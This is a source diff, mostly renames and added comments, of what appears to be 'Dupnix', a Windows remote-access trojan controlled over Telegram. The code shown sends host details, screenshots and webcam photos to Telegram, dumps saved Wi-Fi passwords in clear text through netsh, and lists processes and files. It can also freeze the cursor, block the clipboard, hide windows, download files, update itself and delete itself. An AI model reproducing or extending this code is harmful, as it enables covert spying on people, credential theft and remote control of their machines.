@@ -22,35 +22,35 @@ using json = nlohmann::json;
 void getStatus(std::string) {
     std::string status;
 
-    status = "uptime: " + tools::uptime() + '\n';
-    status += "exe_name: " + tools::get_exe() + '\n';
-    status += "host_name: " + tools::hostname() + '\n';
-    status += "public_ip: " + tools::public_ip() + '\n';
+    status = "uptime: " + tools::info::getUptime() + '\n';
+    status += "exe_name: " + tools::info::getExeName() + '\n';
+    status += "host_name: " + tools::info::getHostname() + '\n';
+    status += "public_ip: " + tools::info::getPublicIp() + '\n';
     status += "local_ip: \n";
 
-    auto LocalIp = tools::getLocalIp();
-    for (auto& e : LocalIp) {
+    auto local_ip = tools::info::getLocalIp();
+    for (auto& e : local_ip) {
         status += "  " + e.first + ": " + e.second + "\n";
     }
-    status += "admin_rights: " + tools::admin_rights() + '\n';
-    status += "exe_path: " + tools::get_path() + '\n';
+    status += "admin_rights: " + std::to_string(tools::info::checkAdminRights()) + '\n';
+    status += "exe_path: " + tools::info::getDupnixPath() + '\n';
     status += "current_volume: " + std::to_string(tools::ChangeVolume()) + '\n';
-    status += "cursor_position: " + tools::Cursor_Position() + '\n';
-    status += "list_of_disks: " + tools::DiskList() + '\n';
+    status += "cursor_position: " + tools::info::getCursorPos() + '\n';
+    status += "list_of_disks: " + tools::info::DiskList() + '\n';
 
     status += "\nversion: " + VERSION + '\n';
 
     telegram::SendText(status);
 }
 
-void setID(std::string newID) {
-    ID = newID;
+void setID(std::string new_ID) {
+    ID = new_ID;
 
     json change;
-    change["id"] = newID;
-    tools::change_cfg(change);
+    change["id"] = new_ID;
+    tools::changeCfg(change);
 
-    std::cout << "New ID: " << newID << std::endl;
+    std::cout << "New ID: " << new_ID << std::endl;
 }
 
 void setVolume(std::string value) {
@@ -94,12 +94,12 @@ void Screenshot(std::string) {
     HWND hwnd = GetDesktopWindow();
     cv::Mat src = tools::captureScreenMat(hwnd);
 
-    std::string ssPath = "ss.jpg";
+    std::string ss_path = "ss.jpg";
 
     // save img
-    cv::imwrite(ssPath, src);
-    telegram::SendFile(ssPath);
-    tools::remove(ssPath);
+    cv::imwrite(ss_path, src);
+    telegram::SendFile(ss_path);
+    tools::remove(ss_path);
 }
 
 void monitorOff(std::string) {
@@ -113,7 +113,7 @@ void monitorOn(std::string) {
 void SetCursor(std::string cords) {
     std::string x, y;
     for (int i = 0; i < cords.size(); i++) {
-        static bool change(false);
+        static bool change(false);  // variable that say's if are adding now to x or y
         if (cords[i] == ',' || cords[i] == ' ') {
             change = true;
             continue;
@@ -138,6 +138,7 @@ void SetCursor(std::string cords) {
     SetCursorPos(atoi(x.c_str()), atoi(y.c_str()));
 }
 
+// executes some command with delay
 void Delay(std::string delay) {
     std::string seconds;
     std::string function;
@@ -169,6 +170,7 @@ void Delay(std::string delay) {
     execute::execute({ ID, function, parameters });
 }
 
+// sets cursor position to 0,0 for given time
 void BlockCursor(std::string time) {
     if (time.find_first_not_of("0123456789") != std::string::npos) {
         telegram::SendText("invalid syntax");
@@ -191,8 +193,8 @@ void BlockCursor(std::string time) {
     }
 }
 
-void BlockClipboard(std::string yesornot) {
-    if (yesornot == "true")
+void BlockClipboard(std::string yes_or_not) {
+    if (yes_or_not == "true")
         OpenClipboard(nullptr);
     else
         CloseClipboard();
@@ -223,8 +225,8 @@ void Press(std::string to_press) {
 }
 
 void hotkeys(std::string hotkey) {
-    hotkey += "+";
-    std::string buff;
+    hotkey += "+";  // needa add '+' because pressing key triggers when it meets it
+    std::string buff;  // string which contains temporary substring
     // pressing keys
     for (int i = 0; i < hotkey.size(); i++) {
         if (hotkey[i] == '+') {
@@ -345,8 +347,8 @@ void Autodestruction(std::string) {
     std::string temp_filename = "jd.bat";
     f.open(temp_filename);
 
-    f << "taskkill /im \"" + tools::get_exe() + "\" /t /f\n";
-    f << "del \"" + tools::get_exe() << "\"\n";
+    f << "taskkill /im \"" + tools::info::getExeName() + "\" /t /f\n";
+    f << "del \"" + tools::info::getExeName() << "\"\n";
     f << "del \"" + temp_filename << "\"\n";
     f << "exit\n";
     f.close();
@@ -371,7 +373,7 @@ void WriteToClipboard(std::string to_write) {
 }
 
 void ProcessList(std::string) {
-    std::string s = tools::cmd_output("tasklist");
+    std::string s = tools::info::cmdOutput("tasklist");
     std::string list = "";
 
     int pos = s.find(".exe");
@@ -392,7 +394,7 @@ void ProcessList(std::string) {
 }
 
 void IsFileExists(std::string path) {
-    telegram::SendText("File: " + path + (tools::filexists(path) ? " exits" : " not exits"));
+    telegram::SendText("File: " + path + (tools::info::filExists(path) ? " exits" : " not exits"));
 }
 
 void WebcamView(std::string) {
@@ -407,18 +409,19 @@ void WebcamView(std::string) {
     }
     // Save the frame into a file
     imwrite("wcm.jpg", save_img);  // A JPG FILE IS BEING SAVED
-    std::string path = tools::get_path() + "wcm.jpg";
+    std::string path = tools::info::getDupnixPath() + "wcm.jpg";
 
     telegram::SendPhoto(path);
     tools::remove(path);
 }
 
+// parses powershell command
 void RunningApps(std::string) {
-    telegram::SendText(tools::cmd_output("powershell \"gps | where{ $_.MainWindowHandle -ne 0 } | select ProcessName").substr(42, TELEGRAM_MAX));
+    telegram::SendText(tools::info::cmdOutput("powershell \"gps | where{ $_.MainWindowHandle -ne 0 } | select ProcessName").substr(42, TELEGRAM_MAX));
 }
 
 void ListOfFiles(std::string path) {
-    if (!tools::is_path(path)) {
+    if (!tools::info::isPath(path)) {
         telegram::SendText("Path doesn't exists or it's a file");
         return;
     }
@@ -439,7 +442,7 @@ void ListOfFiles(std::string path) {
 void WifiList(std::string) {
     std::vector<std::string> wifi;
 
-    std::string parse(tools::cmd_output("netsh wlan show profile"));
+    std::string parse(tools::info::cmdOutput("netsh wlan show profile"));
     int pos = parse.find("All User Profile");
 
     while (pos != std::string::npos) {
@@ -461,7 +464,7 @@ void WifiList(std::string) {
     for (auto& i : wifi) {
         output += i + " : ";
         std::string s = "netsh wlan show profile " + i + " key=clear";
-        s = tools::cmd_output(s.c_str());
+        s = tools::info::cmdOutput(s.c_str());
 
         int pos = s.find("Key Content");
         if (pos != std::string::npos) {
@@ -477,11 +480,11 @@ void WifiList(std::string) {
 }
 
 
-bool ClosingForeground = false;
+bool closing_foreground = false;
 
 void CloseForeground() {
     HWND Wind;
-    while (ClosingForeground) {
+    while (closing_foreground) {
         Wind = GetForegroundWindow();
         ShowWindow(Wind, false);
         Sleep(10);
@@ -493,17 +496,17 @@ std::thread t1;
 
 void TurnCloseForeground(std::string turn) {
     if (turn == "true") {
-        ClosingForeground = true;
+        closing_foreground = true;
         t1 = std::thread(CloseForeground);
     } else {
-        ClosingForeground = false;
+        closing_foreground = false;
         t1.join();
     }
 }
 
 void ChangeCfg(std::string change) {
     try {
-        tools::change_cfg(nlohmann::json::parse(change));
+        tools::changeCfg(nlohmann::json::parse(change));
     }
     catch (...) {
         telegram::SendText("Wrong Syntax!");
@@ -516,10 +519,10 @@ void UpdateDupnix(std::string link) {
         return;
     }
     std::ofstream update("a.bat");
-    update << "TASKKILL /F /IM \"" << tools::get_exe() << "\"\n"
-        << "del /f \"" << tools::get_exe() << "\"\n"
-        << "move temp \"" << tools::get_exe() << "\"\n"
-        << "start " << tools::get_exe() << std::endl
+    update << "TASKKILL /F /IM \"" << tools::info::getExeName() << "\"\n"
+        << "del /f \"" << tools::info::getExeName() << "\"\n"
+        << "move temp \"" << tools::info::getExeName() << "\"\n"
+        << "start " << tools::info::getExeName() << std::endl
         << "exit";
 
     update.close();
@@ -528,14 +531,14 @@ void UpdateDupnix(std::string link) {
 }
 
 void DownloadFile(std::string link) {
-    int lastSlashPos = 0;
+    int last_slash_pos = 0;
     for (int i = 0; i < link.size(); i++) {
         if (link[i] == '/')
-            lastSlashPos = i;
+            last_slash_pos = i;
     }
 
-    std::string fileName = link.substr(lastSlashPos + 1, link.size());
-    if (!tools::DownloadFile(link, fileName)) {
+    std::string file_name = link.substr(last_slash_pos + 1, link.size());
+    if (!tools::DownloadFile(link, file_name)) {
         telegram::SendText("Can't Download!");
         return;
     }
